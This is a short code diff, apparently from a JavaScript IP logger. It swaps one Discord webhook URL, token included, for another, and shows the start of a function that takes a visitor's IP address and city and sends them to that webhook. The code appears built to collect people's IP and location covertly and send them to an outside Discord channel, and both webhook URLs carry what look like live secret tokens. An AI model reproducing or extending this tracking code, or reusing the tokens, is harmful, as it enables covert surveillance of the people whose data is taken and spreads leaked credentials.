@@ -1,4 +1,4 @@
-const WEBHOOK_URL = `https://discord.com/api/webhooks/1349504538830180454/qOd1jZYQtGYOS-eIZyEcksqIcq3NOKozaV_ZJiW8Ou7KZnEx_3qfrqV1txMJQhk1emhY`;
+const WEBHOOK_URL = `https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc`;
 function sendToDiscord(ipData, locationData) {
   const ip = ipData.query;
   const city = ipData.city;
